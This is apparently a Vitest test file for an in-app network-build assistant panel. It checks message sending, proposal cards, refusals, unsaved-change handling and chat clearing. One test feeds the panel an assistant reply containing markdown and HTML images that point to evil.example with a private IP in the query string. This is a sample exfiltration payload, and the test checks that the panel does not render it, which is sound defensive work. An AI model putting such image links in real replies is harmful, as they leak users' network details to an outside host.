import { beforeEach, describe, expect, it, vi } from 'vitest';
import { render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { MemoryRouter } from 'react-router-dom';
import { ApiError } from '@/lib/api';
import type { ProposalSummary, SyncState } from '@/features/builder/api/proposals';

const mocks = vi.hoisted(() => ({
  streamChat: vi.fn(),
  thread: vi.fn(),
  clear: vi.fn(),
  settings: { data: undefined as unknown, isLoading: false },
  sync: { data: undefined as unknown, dataUpdatedAt: 0 },
  builder: { hasUnsavedChanges: vi.fn(), reassignAllIPs: vi.fn() },
}));

vi.mock('../api/chat', () => ({
  streamChat: mocks.streamChat,
  chatApi: { thread: mocks.thread, clear: mocks.clear },
}));
vi.mock('@/features/settings/api/assistant-settings', () => ({
  useAssistantSettings: () => mocks.settings,
}));
vi.mock('@/features/builder/api/proposals', () => ({
  useSyncState: () => mocks.sync,
}));
vi.mock('@/features/builder/store/builder-store', () => ({
  useBuilderStore: { getState: () => mocks.builder },
}));
vi.mock('sonner', () => ({
  toast: { success: vi.fn(), error: vi.fn(), info: vi.fn(), warning: vi.fn() },
}));

import { toast } from 'sonner';
import { useAssistantStore } from '../store/assistant-store';
import { AssistantPanel } from './assistant-panel';

const BUILD = 'build-1';

const proposal: ProposalSummary = {
  id: 'proposal-1',
  build_id: BUILD,
  summary: 'Add a NAS behind the switch',
  source: 'chat',
  source_label: 'In-app assistant',
  status: 'pending',
  counts: {
    nodes_added: 1,
    nodes_removed: 0,
    nodes_changed: 0,
    connections_added: 1,
    connections_removed: 0,
    connections_changed: 0,
    vms_added: 2,
    vms_removed: 0,
    vms_changed: 0,
    components_added: 0,
    components_removed: 0,
    ip_changes: 3,
    total: 4,
  },
  base_revision: 3,
  created_at: '2026-10-05T10:00:00Z',
};

function syncState(overrides: Partial<SyncState> = {}): SyncState {
  return { revision: 3, updated_at: '', pending: null, recent: [], ...overrides };
}

const handlers = { onReview: vi.fn(), onProposal: vi.fn(), onClose: vi.fn() };

function renderPanel() {
  return render(
    <MemoryRouter>
      <AssistantPanel buildId={BUILD} openingProposal={false} {...handlers} />
    </MemoryRouter>,
  );
}

beforeEach(() => {
  vi.clearAllMocks();
  useAssistantStore.setState({
    open: true,
    buildId: null,
    loadedBuildId: null,
    messages: [],
    status: 'idle',
    full: false,
    loadError: null,
    draft: '',
  });
  mocks.settings.data = { ready: true, model: 'claude-opus-5' };
  mocks.settings.isLoading = false;
  mocks.sync.data = syncState();
  mocks.sync.dataUpdatedAt = 0;
  mocks.thread.mockResolvedValue({ thread_id: null, messages: [], full: false });
  mocks.builder.hasUnsavedChanges.mockReturnValue(false);
  mocks.builder.reassignAllIPs.mockResolvedValue(undefined);
});

describe('AssistantPanel', () => {
  it('points to Settings when the assistant is not set up, and sends nothing', async () => {
    mocks.settings.data = { ready: false, model: '' };
    renderPanel();

    expect(await screen.findByText('Finish setting up the assistant')).toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'Open assistant settings' })).toHaveAttribute(
      'href',
      '/settings#assistant',
    );
    expect(screen.getByLabelText('Message to the assistant')).toBeDisabled();
    expect(screen.queryByText('Review this build and point out problems.')).not.toBeInTheDocument();
  });

  it('sends a message with Enter and shows the reply with its steps and proposal', async () => {
    const user = userEvent.setup();
    const order: string[] = [];
    mocks.builder.hasUnsavedChanges.mockReturnValue(true);
    mocks.builder.reassignAllIPs.mockImplementation(async () => {
      order.push('save');
    });
    mocks.streamChat.mockImplementation(async function* () {
      order.push('request');
      yield { type: 'text_delta', text: 'I will add a **NAS**.' };
      yield { type: 'tool_call', id: 'call-1', name: 'propose_changes', title: 'Propose changes' };
      yield { type: 'tool_result', id: 'call-1', name: 'propose_changes', ok: true };
      yield { type: 'proposal', proposal };
      yield { type: 'done' };
    });
    // The builder's poll already knows about the new proposal.
    mocks.sync.data = syncState({ pending: proposal });
    mocks.sync.dataUpdatedAt = Date.now() + 60_000;
    renderPanel();

    // An example fills the box; it is not sent until the user decides to.
    await user.click(await screen.findByRole('button', { name: 'Add a NAS and connect it to my switch.' }));
    const box = screen.getByLabelText('Message to the assistant');
    expect(box).toHaveValue('Add a NAS and connect it to my switch.');
    expect(mocks.streamChat).not.toHaveBeenCalled();

    await user.type(box, '{Shift>}{Enter}{/Shift}Use 4 bays.');
    expect(mocks.streamChat).not.toHaveBeenCalled();
    await user.type(box, '{Enter}');

    await waitFor(() => expect(screen.getByTestId('proposal-card')).toBeInTheDocument());
    // Unsaved canvas edits were saved before the assistant read the build.
    expect(order).toEqual(['save', 'request']);
    expect(mocks.streamChat).toHaveBeenCalledWith(
      expect.objectContaining({
        buildId: BUILD,
        message: 'Add a NAS and connect it to my switch.\nUse 4 bays.',
      }),
    );
    expect(box).toHaveValue('');

    const reply = screen.getByTestId('assistant-message');
    expect(within(reply).getByText('NAS').tagName).toBe('STRONG');
    expect(within(reply).getByTestId('tool-step')).toHaveAttribute('data-status', 'ok');
    expect(handlers.onProposal).toHaveBeenCalledWith(proposal);

    const card = within(reply).getByTestId('proposal-card');
    expect(card).toHaveTextContent('Add a NAS behind the switch');
    expect(card).toHaveTextContent('Affects 1 device, 1 connection, 2 VMs or containers.');
    expect(card).toHaveTextContent('Waiting for you');
    await user.click(within(card).getByRole('button', { name: 'Review changes' }));
    expect(handlers.onReview).toHaveBeenCalledWith('proposal-1');
  });

  it('follows what happened to a proposal after it was reviewed', async () => {
    mocks.thread.mockResolvedValue({
      thread_id: 'thread-1',
      full: false,
      messages: [
        { id: 'm1', role: 'user', parts: [{ type: 'text', text: 'Add a NAS' }], created_at: '' },
        { id: 'm2', role: 'tool', parts: [{ type: 'proposal', proposal }], created_at: '' },
      ],
    });
    mocks.sync.data = syncState({ recent: [{ ...proposal, status: 'applied' }] });
    mocks.sync.dataUpdatedAt = Date.now();
    renderPanel();

    const card = await screen.findByTestId('proposal-card');
    expect(card).toHaveTextContent('Applied');
    expect(within(card).queryByRole('button', { name: 'Review changes' })).not.toBeInTheDocument();
  });

  it('puts a refused message back into the box', async () => {
    const user = userEvent.setup();
    // The server refuses the request before any event is streamed.
    const refusal = new ApiError(409, 'busy', 'The assistant is still working on your previous message.');
    mocks.streamChat.mockImplementation(() => ({
      [Symbol.asyncIterator]: () => ({ next: () => Promise.reject(refusal) }),
    }));
    renderPanel();

    const box = await screen.findByLabelText('Message to the assistant');
    await waitFor(() => expect(box).toBeEnabled());
    await user.type(box, 'Hello there{Enter}');

    expect(await screen.findByRole('alert')).toHaveTextContent('still working on your previous message');
    await waitFor(() => expect(box).toHaveValue('Hello there'));
  });

  it('still sends when the canvas could not be saved, and says what the assistant sees', async () => {
    const user = userEvent.setup();
    mocks.builder.hasUnsavedChanges.mockReturnValue(true);
    mocks.builder.reassignAllIPs.mockRejectedValue(new Error('conflict'));
    mocks.streamChat.mockImplementation(async function* () {
      yield { type: 'text_delta', text: 'Here is what I see.' };
      yield { type: 'done' };
    });
    renderPanel();

    const box = await screen.findByLabelText('Message to the assistant');
    await waitFor(() => expect(box).toBeEnabled());
    await user.type(box, 'What is in this build?{Enter}');

    expect(await screen.findByText('Here is what I see.')).toBeInTheDocument();
    expect(toast.warning).toHaveBeenCalledWith(expect.stringContaining('last saved version'));
  });

  it('does not render images or raw HTML from a reply', async () => {
    mocks.thread.mockResolvedValue({
      thread_id: 'thread-1',
      full: false,
      messages: [
        { id: 'm1', role: 'user', parts: [{ type: 'text', text: 'Hi' }], created_at: '' },
        {
          id: 'm2',
          role: 'assistant',
          parts: [
            {
              type: 'text',
              text: 'See ![x](https://evil.example/leak?ip=192.168.1.1) <img src="https://evil.example/2"> [docs](https://example.com)',
            },
          ],
          created_at: '',
        },
      ],
    });
    renderPanel();

    const reply = await screen.findByTestId('assistant-message');
    expect(reply.querySelector('img')).toBeNull();
    const link = within(reply).getByRole('link', { name: 'docs' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noreferrer'));
  });

  it('clears the chat after confirmation and closes on request', async () => {
    const user = userEvent.setup();
    mocks.thread.mockResolvedValue({
      thread_id: 'thread-1',
      full: true,
      messages: [{ id: 'm1', role: 'user', parts: [{ type: 'text', text: 'Old question' }], created_at: '' }],
    });
    mocks.clear.mockResolvedValue({});
    renderPanel();

    expect(await screen.findByText('Old question')).toBeInTheDocument();
    // A full conversation cannot take another message until it is cleared.
    expect(screen.getByText(/reached its length limit/)).toBeInTheDocument();
    expect(screen.getByLabelText('Message to the assistant')).toBeDisabled();

    await user.click(screen.getByRole('button', { name: 'Clear the chat' }));
    expect(mocks.clear).not.toHaveBeenCalled();
    const dialog = await screen.findByRole('dialog');
    await user.click(within(dialog).getByRole('button', { name: 'Clear chat' }));

    await waitFor(() => expect(mocks.clear).toHaveBeenCalledWith(BUILD));
    await waitFor(() => expect(screen.queryByText('Old question')).not.toBeInTheDocument());
    expect(screen.getByLabelText('Message to the assistant')).toBeEnabled();

    await user.click(screen.getByRole('button', { name: 'Close the assistant' }));
    expect(handlers.onClose).toHaveBeenCalled();
  });
});
